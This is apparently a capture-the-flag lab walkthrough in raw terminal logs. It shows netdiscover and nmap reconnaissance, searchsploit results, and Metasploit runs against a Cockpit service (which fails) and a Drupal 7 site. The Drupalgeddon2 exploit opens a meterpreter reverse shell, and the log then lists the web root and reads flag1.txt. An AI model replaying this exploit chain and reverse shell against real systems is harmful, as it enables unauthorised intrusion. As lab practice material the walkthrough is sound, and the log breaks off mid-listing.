Bridge Adapter Configuration
 ```
 >> netdiscover -r 10.233.56.1/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                 
                                                                                                                                               
 6 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 360                                                                               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.233.56.95    54:14:f3:dd:01:26      4     240  Intel Corporate                                                                             
 10.233.56.60    be:88:08:70:f5:61      2     120  Unknown vendor        
 ```

```
┌──(root㉿kali)-[/home/kali]
└─# nmap -p- -sS -sV -A 10.233.56.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 03:53 EST
Stats: 0:01:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 03:55 (0:00:00 remaining)
Nmap scan report for 10.233.56.95
Host is up (0.00016s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
9090/tcp open  ssl/http Cockpit web service
|_ssl-date: TLS randomness does not represent time
|_http-title: Loading...
| ssl-cert: Subject: commonName=shibu/organizationName=b98a2262a2cf432c97935b5554f1348d
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2025-03-24T05:04:16
|_Not valid after:  2026-04-23T05:04:16
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     X-Frame-Options: sameorigin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|_    font-weight: 300;
| http-robots.txt: 1 disallowed entry 
|_/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.95%T=SSL%I=7%D=11/21%Time=692028D0%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,DB7,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type
SF::\x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-D
SF:NS-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-
SF:origin\r\nX-Frame-Options:\x20sameorigin\r\n\r\n29\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nc3
SF:2\r\n</title>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20
SF:content=\"text/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name
SF:=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">
SF:\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDisplay\",\x
SF:20\"Open\x20Sans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201\.66666667;\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f5f5f5;\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20img\x
SF:20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x200;\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\x20middle;
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20h1
SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20
SF:300;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20")%r(HTTPOptio
SF:ns,DB7,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DNS-Prefetch-C
SF:ontrol:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-origin\r\nX-F
SF:rame-Options:\x20sameorigin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<h
SF:ead>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nc32\r\n</title>
SF:\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"tex
SF:t/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"
SF:\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x2
SF:0\x20<style>\n\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDisplay\",\x20\"Open\x20S
SF:ans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20line-height:\x201\.66666667;\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20background-color:\x20#f5f5f5;\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\x20middle;\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20300;\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20");
MAC Address: 54:14:F3:DD:01:26 (Intel Corporate)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.16 ms 10.233.56.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.54 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ searchsploit Cockpit     
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL In | multiple/webapps/50185.py
Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Request Forgery               | php/webapps/44567.txt
Cockpit CMS 0.6.1 - Remote Code Execution                             | php/webapps/49390.txt
Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)   | multiple/webapps/49397.txt
openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                    | php/webapps/47305.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```
                                                                                                        
┌──(root㉿kali)-[/home/kali]
└─# msfconsole
Metasploit tip: Store discovered credentials for later use with creds
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                                                                                                                                                   
                                              `MjM~~WE.ARE.se~~MMjMs                                                                                                                                                                        
                                               +~KANSAS.CITY's~-`                                                                                                                                                                           
                                                J~HAKCERS~./.`                                                                                                                                                                              
                                                .esc:wq!:`                                                                                                                                                                                  
                                                 +++ATH`                                                                                                                                                                                    
                                                  `                                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
       =[ metasploit v6.4.98-dev                                ]                                                                                                                                                                           
+ -- --=[ 2,571 exploits - 1,316 auxiliary - 1,680 payloads     ]                                                                                                                                                                           
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]                                                                                                                                                                           
                                                                                                                                                                                                                                            
Metasploit Documentation: https://docs.metasploit.com/                                                                                                                                                                                      
The Metasploit Framework is a Rapid7 Open Source Project                                                                                                                                                                                    
                                                                                                                                                                                                                                            
msf > search cockpit
                                                                                                                                                                                                                                            
Matching Modules                                                                                                                                                                                                                            
================                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
   #  Name                                Disclosure Date  Rank    Check  Description                                                                                                                                                       
   -  ----                                ---------------  ----    -----  -----------
   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce

msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(multi/http/cockpit_cms_rce) > options

Module options (exploit/multi/http/cockpit_cms_rce):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   ENUM_USERS  true             no        Enumerate users
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, sapni
   RHOSTS                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The URI of Cockpit
   USER                         no        User account to take over
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.233.56.40     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(multi/http/cockpit_cms_rce) > set RHOSTS 10.233.56.95
RHOSTS => 10.233.56.95
msf exploit(multi/http/cockpit_cms_rce) > set RPORT 9090
RPORT => 9090
msf exploit(multi/http/cockpit_cms_rce) > exploit
[*] Started reverse TCP handler on 10.233.56.40:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[-] Exploit aborted due to failure: unexpected-reply: 10.233.56.95:9090 - Could not connect to the web service
[*] Exploit completed, but no session was created.


```


After trying any of these option, I saw somewhere that there are more services present on this current VM, so I used any other command for NMAP to get more information of the VM.

```

┌──(root㉿kali)-[/home/kali]
└─# nmap -A 10.0.2.10         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 04:56 EST
Nmap scan report for 10.0.2.10
Host is up (0.00042s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41184/tcp6  status
|   100024  1          41377/udp   status
|   100024  1          43877/tcp   status
|_  100024  1          55458/udp6  status
MAC Address: 08:00:27:AE:A2:85 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 10.0.2.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.61 seconds


                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali]
└─# searchsploit OpenSSH 6.0p1
-------------------------------------------------------------------------------
Exploit Title                                 |  Path

OpenSSH 2.3 < 7.7 - Username Enumeration      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)| linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution  | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution        | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                          | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)          | linux/remote/45939.py
--------------------------------------------------------------------------------

┌──(root㉿kali)-[/home/kali]
└─# searchsploit drupal 7
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 10.1.2 - web-cache-poisoning-External-service-interaction                                                                                           | php/webapps/51723.txt
Drupal 4.1/4.2 - Cross-Site Scripting                                                                                                                      | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                                                                                              | php/webapps/1088.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                                | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                                                                              | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                                                                                                    | php/webapps/4510.txt
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                     | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                          | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                           | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                                | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                                | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                   | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                                                     | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                                                                         | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                    | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                                                                                                      | php/webapps/3312.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                                                              | php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                                                                                          | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                   | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                   | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                        | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                    | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                    | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                           | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                      | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                      | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                             | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                         | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                          | php/webapps/44501.txt
Drupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripting (XSS)                                                                                         | php/webapps/50841.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                     | php/webapps/25493.txt
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                                            | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                              | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                                                                                    | php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload                                                                             | php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities                                               | php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                          | php/remote/40130.rb
Drupal Module Sections - Cross-Site Scripting                                                                                                              | php/webapps/10485.txt
Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection                                                                                                    | php/webapps/33410.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

And here I got the shell of VM : 
```
┌──(root㉿kali)-[/home/kali]
└─# msfconsole
Metasploit tip: Search can apply complex filters such as search cve:2009 
type:exploit, see all the filters with help search
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.4.98-dev                                ]
+ -- --=[ 2,571 exploits - 1,316 auxiliary - 1,683 payloads     ]
+ -- --=[ 433 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search Drupal

Matching Modules
================

   #   Name                                                              Disclosure Date  Rank       Check  Description
   -   ----                                                              ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2     \_ target: Automatic (PHP In-Memory)                            .                .          .      .
   3     \_ target: Automatic (PHP Dropper)                              .                .          .      .
   4     \_ target: Automatic (Unix In-Memory)                           .                .          .      .
   5     \_ target: Automatic (Linux Dropper)                            .                .          .      .
   6     \_ target: Drupal 7.x (PHP In-Memory)                           .                .          .      .
   7     \_ target: Drupal 7.x (PHP Dropper)                             .                .          .      .
   8     \_ target: Drupal 7.x (Unix In-Memory)                          .                .          .      .
   9     \_ target: Drupal 7.x (Linux Dropper)                           .                .          .      .
   10    \_ target: Drupal 8.x (PHP In-Memory)                           .                .          .      .
   11    \_ target: Drupal 8.x (PHP Dropper)                             .                .          .      .
   12    \_ target: Drupal 8.x (Unix In-Memory)                          .                .          .      .
   13    \_ target: Drupal 8.x (Linux Dropper)                           .                .          .      .
   14    \_ AKA: SA-CORE-2018-002                                        .                .          .      .
   15    \_ AKA: Drupalgeddon 2                                          .                .          .      .
   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  .                .          .      .
   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   .                .          .      .
   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   22    \_ target: PHP In-Memory                                        .                .          .      .
   23    \_ target: Unix In-Memory                                       .                .          .      .
   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval

msf > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, sapni
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.6         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)



View the full module info with the info, or info -d command.

msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.0.2.10
RHOSTS => 10.0.2.10
msf exploit(unix/webapp/drupal_drupalgeddon2) > exploit
[*] Started reverse TCP handler on 10.0.2.6:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (41224 bytes) to 10.0.2.10
[*] Meterpreter session 1 opened (10.0.2.6:4444 -> 10.0.2.10:45730) at 2025-11-24 13:43:20 -0500

meterpreter > 
meterpreter > ls
Listing: /var/www
=================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  747324309678    fil   188498731153-02-08 21:33:43 -0500  .gitignore
100644/rw-r--r--  24769076401799  fil   188498731153-02-08 21:33:43 -0500  .htaccess
100644/rw-r--r--  6360846566857   fil   188498731153-02-08 21:33:43 -0500  COPYRIGHT.txt
100644/rw-r--r--  6231997547947   fil   188498731153-02-08 21:33:43 -0500  INSTALL.mysql.txt
100644/rw-r--r--  8048768714578   fil   188498731153-02-08 21:33:43 -0500  INSTALL.pgsql.txt
100644/rw-r--r--  5574867551506   fil   188498731153-02-08 21:33:43 -0500  INSTALL.sqlite.txt
100644/rw-r--r--  76712410891717  fil   188498731153-02-08 21:33:43 -0500  INSTALL.txt
100755/rwxr-xr-x  77704548337324  fil   188270147139-03-11 10:02:15 -0500  LICENSE.txt
100644/rw-r--r--  35180077129727  fil   188498731153-02-08 21:33:43 -0500  MAINTAINERS.txt
100644/rw-r--r--  23089744188672  fil   188498731153-02-08 21:33:43 -0500  README.txt
100644/rw-r--r--  41412074677674  fil   188498731153-02-08 21:33:43 -0500  UPGRADE.txt
100644/rw-r--r--  28363964029388  fil   188498731153-02-08 21:33:43 -0500  authorize.php
100644/rw-r--r--  3092376453840   fil   188498731153-02-08 21:33:43 -0500  cron.php
100644/rw-r--r--  223338299444    fil   211037522224-07-25 00:21:02 -0400  flag1.txt
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  includes
100644/rw-r--r--  2272037700113   fil   188498731153-02-08 21:33:43 -0500  index.php
100644/rw-r--r--  3019362009791   fil   188498731153-02-08 21:33:43 -0500  install.php
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  misc
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  modules
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  profiles
100644/rw-r--r--  6704443950617   fil   188498731153-02-08 21:33:43 -0500  robots.txt
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  scripts
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  sites
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  themes
100644/rw-r--r--  85645942869477  fil   188498731153-02-08 21:33:43 -0500  update.php
100644/rw-r--r--  9354438772866   fil   188498731153-02-08 21:33:43 -0500  web.config
100644/rw-r--r--  1791001362849   fil   188498731153-02-08 21:33:43 -0500  xmlrpc.php

meterpreter > cat flag1.txt
Every good CMS needs a config file - and so do you.

meterpreter > cat flag1.txt
Every good CMS needs a config file - and so do you.
meterpreter > find ./ -name config
[-] Unknown command: find. Run the help command for more details.
meterpreter > pwd
/var/www
meterpreter > cd
Usage: cd directory
meterpreter > ls
Listing: /var/www
=================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  747324309678    fil   188498731153-02-08 21:33:43 -0500  .gitignore
100644/rw-r--r--  24769076401799  fil   188498731153-02-08 21:33:43 -0500  .htaccess
100644/rw-r--r--  6360846566857   fil   188498731153-02-08 21:33:43 -0500  COPYRIGHT.txt
100644/rw-r--r--  6231997547947   fil   188498731153-02-08 21:33:43 -0500  INSTALL.mysql.txt
100644/rw-r--r--  8048768714578   fil   188498731153-02-08 21:33:43 -0500  INSTALL.pgsql.txt
100644/rw-r--r--  5574867551506   fil   188498731153-02-08 21:33:43 -0500  INSTALL.sqlite.txt
100644/rw-r--r--  76712410891717  fil   188498731153-02-08 21:33:43 -0500  INSTALL.txt
100755/rwxr-xr-x  77704548337324  fil   188270147139-03-11 10:02:15 -0500  LICENSE.txt
100644/rw-r--r--  35180077129727  fil   188498731153-02-08 21:33:43 -0500  MAINTAINERS.txt
100644/rw-r--r--  23089744188672  fil   188498731153-02-08 21:33:43 -0500  README.txt
100644/rw-r--r--  41412074677674  fil   188498731153-02-08 21:33:43 -0500  UPGRADE.txt
100644/rw-r--r--  28363964029388  fil   188498731153-02-08 21:33:43 -0500  authorize.php
